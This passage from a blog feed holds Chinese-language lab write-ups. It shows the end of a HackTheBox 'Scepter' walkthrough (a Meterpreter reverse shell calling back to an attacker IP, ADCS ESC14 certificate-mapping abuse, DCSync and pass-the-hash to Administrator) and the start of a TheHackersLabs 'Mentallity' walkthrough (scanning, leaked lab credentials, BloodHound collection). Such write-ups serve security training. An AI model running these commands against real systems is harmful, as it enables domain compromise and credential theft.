SCEPTER.HTB = {\n        kdc = dc01.scepter.htb\n        admin_server = dc01.haze.htb\n    }\n\n[domain_realm]\n    .scepter.htb = scepter.HTB\n    scepter.htb = scepter.HTB\n```\n\n使用`evil-winrm`登录\n\n```bash\n➜  Scepter ntpdate -s 10.10.11.65 ; evil-winrm -r scepter.htb -i dc01.scepter.htb -u h.brown\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: User is not needed for Kerberos auth. Ticket will be used\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> \n```\n\n终于登录进来了，事不宜迟先读 user.txt\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Desktop> type user.txt\n4e1f18052814cfb9f26a1497a8bc1cc6\n```\n\n收集一波数据\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID                                        Attributes\n=========================================== ================ ========================================== ==================================================\nEveryone                                    Well-known group S-1-1-0                                    Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group\nSCEPTER\\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group\nSCEPTER\\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group\nAuthentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group\n```\n\n## To P.adams\n\n### ESC14 - **对 altSecurityIdentities 的写入访问权限**\n\n现在目标用户是 `P.adams`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image5.png)\n\n枚举用户 `h.brown`  是否有修改某些对象（如组成员关系、ACL 或权限）的能力。\n\n```bash\n➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u h.brown -k get writable --de\n...\ndistinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb\naltSecurityIdentities: WRITE\n```\n\n对 `p.adams` 的 `altSecurityIdentities` 可写\n\n大概是可以利用：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities | https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9\n\n攻击者对目标的 `altSecurityIdentities` 属性具有写入权限。他可以将证书注册为受害者，并通过修改其 `altSecurityIdentities` 属性并将其指向获取的证书来为目标创建显式映射。然后，可以使用该证书作为目标进行身份验证。\n\n攻击根据：https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9 的 `ESC14`场景`A` \n\n先使用 h.brown 来进行上线 MSF，后续一些操作在`evil-winrm`中操作会有`bug`\n\n```bash\n➜  Scepter msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.59 lport=1234 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: shell.exe\n```\n\n```bash\n➜  Scepter msfconsole \nMetasploit tip: View all productivity tips with the tips command\n\n_                                                    _\n/ \\    /\\         __                         _   __  /_/ __\n| |\\  / | _____   \\ \\           ___   _____ | | /  \\ _   \\ \\\n| | \\/| | | ___\\ |- -|   /\\    / __\\ | -__/ | || | || | |- -|\n|_|   | | | _|__  | |_  / -\\ __\\ \\   | |    | | \\__/| |  | |_\n|/  |____/  \\___\\/ /\\ \\\\___/   \\/     \\__|    |_\\  \\___\\\n\n=[ metasploit v6.4.34-dev                          ]\n+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]\n+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\n[*] Starting persistent handler(s)...\nmsf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set lport 1234\nlport => 1234\nmsf6 exploit(multi/handler) > set lhost 10.10.16.59\nlhost => 10.10.16.59\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> upload shell.exe\n                                        \nInfo: Uploading /root/Desktop/test/Scepter/shell.exe to C:\\Users\\h.brown\\Documents\\shell.exe\n                                        \nData: 98400 bytes of 98400 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\h.brown\\Documents> ./shell.exe\n```\n\n```bash\nmsf6 exploit(multi/handler) > run\n\n[*] Started reverse TCP handler on 10.10.16.59:1234 \n[*] Sending stage (177734 bytes) to 10.10.11.65\n[*] Meterpreter session 1 opened (10.10.16.59:1234 -> 10.10.11.65:60515) at 2025-04-26 06:25:04 -0400\n\nmeterpreter > \n```\n\n创建计算机账户 `ciallo`\n\n```bash\n➜  Scepter bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 123456 add computer ciallo 123456\n[+] ciallo created\n```\n\n通过 `certipy` 请求证书\n\n```bash\n➜  Scepter certipy-ad req -username \"ciallo$\" -p 123456 -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'Machine' -dc-ip 10.10.11.65 -debug\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Trying to resolve 'dc01.scepter.htb' at '10.10.11.65'\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.10.11.65[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 23\n[*] Got certificate with DNS Host Name 'ciallo.scepter.htb'\n[*] Certificate object SID is 'S-1-5-21-74879546-916818434-740295365-9104'\n[*] Saved certificate and private key to 'ciallo.pfx'\n```\n\n将证书转换为`crt`并查看信息\n\n```bash\n➜  Scepter certipy-ad cert -pfx ciallo.pfx -nokey -out ciallo.crt\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Writing certificate and  to 'ciallo.crt'\n```\n\n```bash\n➜  Scepter openssl x509 -in ciallo.crt -noout -serial -issuer\nserial=620000001B02CCD1DA2D79435E00000000001B\nissuer=DC=htb, DC=scepter, CN=scepter-DC01-CA\n```\n\n我们使用证书中的序列号和颁发者 `distinguishedName` 来获取 `X509IssuerSerialNumber` 映射格式\n\n使用 GPT 来根据脚本：https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1 改编为 Python 脚本，并运行。\n\n```bash\nimport argparse\n\ndef convert(serial, issuer):\n    serial = serial.replace(':', '').lower()\n    serial_bytes = bytearray.fromhex(serial)\n    serial_bytes.reverse()\n    serial_hex = ''.join(['%02x' % b for b in serial_bytes])\n    \n    # 拆分 issuer，并反转顺序\n    issuer_parts = issuer.split(',')\n    issuer_parts = [p.strip() for p in issuer_parts]\n    issuer_parts.reverse()  # 反转顺序，这里不改\n    issuer_str = ','.join(issuer_parts)\n    \n    # 调整输出顺序：确保 \"DC=scepter,DC=htb\" 在 \"CN=scepter-DC01-CA\" 之前\n    issuer_str = issuer_str.replace(\"CN=\", \"\").replace(\"DC=\", \"CN=\").replace(\",\", \",DC=\").strip()\n    \n    print(f\"X509:<I>{issuer_str}<SR>{serial_hex}\")\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-serial', required=True, help='Certificate serial (colon separated)')\n    parser.add_argument('-issuer', required=True, help='Certificate issuer')\n    args = parser.parse_args()\n    \n    convert(args.serial, args.issuer)\n```\n\n```bash\n➜  Scepter python Get-X509IssuerSerialNumberFormat.py\nX509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>B10000000000E53497D2AD1DCC20B100000026\n```\n\n通过 PowerShell 更改用户 h.brown 的 `altSecurityIdentities` 属性（GPT）\n\n```bash\n$map = 'X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>2800000000008dde9c88b25b6ad22800000062'\nSet-ADUser p.adams -Replace @{altSecurityIdentities=$map}\n```\n\n```bash\nmeterpreter > shell\nProcess 4920 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.7131]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\h.brown\\Documents>powershell\npowershell\nWindows PowerShell \nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\h.brown\\Documents> $map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'\n$map = 'X509:<I>CN=scepter-DC01-CA,DC=scepter,DC=htb<SR>170000000000f4a3741fa7d9137b1700000062'\nPS C:\\Users\\h.brown\\Documents> Set-ADUser -Identity \"p.adams\" -Replace @{altSecurityIdentities=$map}\nSet-ADUser -Identity \"p.adams\" -Replace @{altSecurityIdentities=$map}\n```\n\n查看更改后的属性值\n\n```bash\nGet-ADUser -Identity \"p.adams\" -Properties altSecurityIdentities | Select-Object altSecurityIdentities\n```\n\n通过 `certipy` 根据计算机账户的证书 `ciallo.pfx` 申请用户 `p.adams` 的 `TGT`\n\n```bash\n➜  Scepter certipy-ad auth -pfx ciallo.pfx -dc-ip 10.10.11.65 -username p.adams\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'ciallo$'\nDo you want to continue? (Y/n) y\n[*] Using principal: p.adams@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'p.adams.ccache'\n[*] Trying to retrieve NT hash for 'p.adams'\n[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image6.png)\n\n直接 `DCSync`\n\n```bash\n➜  Scepter secretsdump.py -k -no-pass dc01.scepter.htb -dc-ip 10.10.11.65                                       \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n                                                                                                               \n[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::\n...many...\n```\n\n```bash\n➜  Scepter evil-winrm -i dc01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> \n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> type root.txt\nfcd40eb94aeca1942488f8decb6cc0b7\n```\n\n## 总结\n\n反正就是每次打AD都是不会的，靠大佬带过的…\n\n第一次遇到 ADCS 类的攻击，无从下手，任重道远。\n",
            "url": "https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter",
            "title": "HackTheBox - Machine - Scepter",
            "summary": "Machine Scepterl https://app.hackthebox.com/machines/Scepter | Hard PS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜 前期踩点 Windows 靶机的端口，但不一定是域控主机（PS:后面才知道我扫...",
            "date_modified": "2025-04-26T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "Windows靶机",
                "HackTheBox",
                "ADCS",
                "ESC"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity",
            "content_html": "\n# Mentallity\n\n> https://labs.thehackerslabs.com/machine/120\n> \n\n![image.png](/post-images/TheHackersLabsMentallity/image.png)\n\n## Recon\n\n### PortScan\n\n`namp` 端口扫描\n\n```bash\n➜  Mentallity nmap -sn 192.168.56.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:45 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00032s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00027s latency).\nMAC Address: 08:00:27:3B:D1:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.28\nHost is up (0.00024s latency).\nMAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.91\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:11:40:07 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 27.97 seconds\n```\n\n貌似是双网卡\n\n```bash\n➜  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.28\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST \nWarning: 192.168.56.28 giving up on port because retransmission cap hit (10). \nNmap scan report for 192.168.56.28              \nHost is up (0.00057s latency).                  \nNot shown: 63744 closed tcp ports (conn-refused), 1762 filtered tcp ports (no-response)\nPORT      STATE SERVICE                         \n21/tcp    open  ftp                             \n53/tcp    open  domain                          \n80/tcp    open  http                            \n88/tcp    open  kerberos-sec                    \n135/tcp   open  msrpc                           \n139/tcp   open  netbios-ssn                     \n389/tcp   open  ldap                            \n445/tcp   open  microsoft-ds                    \n464/tcp   open  kpasswd5                        \n593/tcp   open  http-rpc-epmap                  \n636/tcp   open  ldapssl                         \n3268/tcp  open  globalcatLDAP                   \n3269/tcp  open  globalcatLDAPssl                \n5985/tcp  open  wsman                           \n8080/tcp  open  http-proxy                      \n9389/tcp  open  adws                            \n47001/tcp open  winrm  \n...    \n\n➜  Mentallity nmap -sT -min-rate 10000 -p- 192.168.56.91\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:46 CST\nWarning: 192.168.56.91 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.91\nHost is up (0.00024s latency).\nNot shown: 63929 closed tcp ports (conn-refused), 1577 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n8080/tcp  open  http-proxy\n9389/tcp  open  adws\n47001/tcp open  winrm    \n...     \n```\n\n```bash\n➜  Mentallity nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.28\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 20:49 CST\nNmap scan report for 192.168.56.28\nHost is up (0.00046s latency).\n\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst:\n|_  SYST: Windows_NT\n|_ssl-date: 2025-07-23T12:50:56+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=VulnFTP\n| Subject Alternative Name: DNS:VulnFTP\n| Not valid before: 2025-07-17T09:01:44\n|_Not valid after:  2026-07-17T09:21:44\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n| http-methods:\n|_  Potentially risky methods: TRACE\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 12:50:06Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n|_ssl-date: TLS randomness does not represent time                                                                                                                                              \n445/tcp   open  microsoft-ds?                                                                                                                                                                   \n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n|_ssl-date: TLS randomness does not represent time\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n8080/tcp  open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Mentality \\xC2\\xB7 Innovating Beyond Limits\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2022 (99%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows 11 21H2 (96%), Windows Server 2019 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1703 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: WIN-9FQTT7GPAVK; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-07-23T12:50:48\n|_  start_date: N/A\n|_nbstat: NetBIOS name: WIN-9FQTT7GPAVK, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c2:70:8b (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 70.86 seconds\n```\n\n### 枚举测试\n\n`SMB` 匿名账户测试\n\n```bash\n➜  Mentallity nxc smb 192.168.56.28 -u anonymous -p '' --smb-timeout 9999\nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [-] mentality.thl\\anonymous: STATUS_LOGON_FAILURE\n```\n\nFTP 匿名测试\n\n```bash\n➜  Mentallity ftp 192.168.56.28                      \nConnected to 192.168.56.28.\n220 Microsoft FTP Service\nName (192.168.56.28:root): anonymous\n331 Password required\nPassword: \n530 User cannot log in.\nftp: Login failed\n```\n\n### HTTP\n\nHTTP - 80\n\n![image.png](/post-images/TheHackersLabsMentallity/image1.png)\n\n```bash\n➜  Mentallity feroxbuster --url http://192.168.56.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.28\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      334l     2089w   180418c http://192.168.56.28/iisstart.png\n200      GET       32l       55w      703c http://192.168.56.28/\n[####################] - 2m   1038160/1038160 0s      found:2       errors:0\n[####################] - 2m   1038145/1038145 10180/s http://192.168.56.28/\n```\n\nHTTP - 8080\n\n![image.png](/post-images/TheHackersLabsMentallity/image2.png)\n\n发现一个登录页面\n\n![image.png](/post-images/TheHackersLabsMentallity/image3.png)\n\n我们点击登录的时候发现很奇怪，因为并没有提交数据\n\n然后可以注意到只加载了一个 `JS` 脚本\n\n![image.png](/post-images/TheHackersLabsMentallity/image4.png)\n\n脚本内容\n\n```bash\nfunction validateForm() {\n    const u = document.getElementById(\"username\").value;\n    const p = document.getElementById(\"password\").value;\n    const errorMessage = document.getElementById(\"errorMessage\");\n\n    if (u === \"admin\" && p === \"adminpass123\") {\n        window.location.href = \"dashboard.html\";\n        return false;\n    }\n    errorMessage.textContent = \"Invalid Username Or Password!\";\n    return false;\n}\n```\n\n我们直接转到 `ashboard.html`\n\n![image.png](/post-images/TheHackersLabsMentallity/image5.png)\n\n得到一串 `BASE64` 编码后的字符串，解密后得到 `FTP`的账户\n\n![image.png](/post-images/TheHackersLabsMentallity/image6.png)\n\n发现里面有三个文件\n\n```bash\n➜  Mentallity ftp 192.168.56.28\nConnected to 192.168.56.28.\n220 Microsoft FTP Service\nName (192.168.56.28:root): ftpuser \n331 Password required\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp> ls\n229 Entering Extended Passive Mode (|||54349|)\n125 Data connection already open; Transfer starting.\n07-17-25  08:52AM              1608612 ad_hc_mentality_htl.html\n07-17-25  05:48AM                   34 flag.txt\n07-17-25  12:13AM                   75 web.config\n226 Transfer complete.\nftp> \n```\n\n其中这个就是 `user.txt`\n\n```bash\n➜  Mentallity cat flag.txt      \nFLAG{thisxxxxxxxxxxxxxxxxxxxxxx\n```\n\n另外一个 `HTML` 文件是安全分析结果，是关于域的\n\n![image.png](/post-images/TheHackersLabsMentallity/image7.png)\n\n在报告中能得到一个凭据 `svcapp1`:`Hola1234$` ，并且也知道了 `ftpuser` 也是可以在域中进行认证的\n\n![image.png](/post-images/TheHackersLabsMentallity/image8.png)\n\n测试凭据\n\n```bash\n➜  Mentallity nxc smb 192.168.56.28 -u 'svcapp1' -p 'Hola1234$' --smb-timeout 9999                  \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [+] mentality.thl\\svcapp1:Hola1234$\n\n➜  Mentallity nxc ldap 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'               \nLDAP        192.168.56.28   389    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)\nLDAPS       192.168.56.28   636    WIN-9FQTT7GPAVK  [+] mentality.thl\\svcapp1:Hola1234$\n \n➜  Mentallity nxc winrm 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'\nWINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [-] mentality.thl\\svcapp1:Hola1234$ \n```\n\n`SMB` 文件列表\n\n```bash\n➜  192.168.56.28 tree\n.\n└── SYSVOL\n    └── mentality.thl\n        └── Policies\n            ├── {31B2F340-016D-11D2-945F-00C04FB984F9}\n            │   ├── GPT.INI\n            │   └── MACHINE\n            │       ├── Microsoft\n            │       │   └── Windows NT\n            │       │       └── SecEdit\n            │       │           └── GptTmpl.inf\n            │       └── Registry.pol\n            └── {6AC1786C-016F-11D2-945F-00C04fB984F9}\n                ├── GPT.INI\n                └── MACHINE\n                    └── Microsoft\n                        └── Windows NT\n                            └── SecEdit\n                                └── GptTmpl.inf\n```\n\n## 域分析\n\n收集信息\n\n```bash\n➜  Mentallity bloodhound-python -d 'mentality.thl' -ns 192.168.56.28 --zip -c All -dc 'WIN-9FQTT7GPAVK.mentality.thl' -u svcapp1 -p 'Hola1234$'                                                \nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: mentality.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl\nWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl\nWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...\nINFO: Found 6 users\nINFO: Found 55 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-9FQTT7GPAVK.mentality.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250723214935_bloodhound.zip\n```\n\n用户组\n\n![image.png](/post-images/TheHackersLabsMentallity/image9.png)\n\n翻了半天并没有发现什么可以利用的\n\n## ESC 7\n\n使用 `certipy-ad` 枚举一下证书漏洞\n\n```bash\n➜  Mentallity certipy-ad -debug find -dc-ip 192.168.56.28 -u svcapp1 -p Hola1234$ -vulnerable -text -target 